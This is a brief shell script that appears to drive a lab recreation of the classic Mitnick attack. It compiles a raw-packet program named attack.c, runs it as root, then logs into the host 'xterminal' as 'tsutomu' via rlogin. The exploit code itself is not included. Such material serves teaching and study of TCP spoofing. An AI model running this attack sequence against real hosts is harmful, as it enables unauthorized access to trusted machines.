#!/bin/sh
echo compiling
gcc -Wall -Wextra -O3 -o attack -lnet -lpcap attack.c
echo starting the attack
sudo ./attack
echo waiting 2 seconds
sleep 2
echo connecting to xterminal
rlogin -l tsutomu xterminal
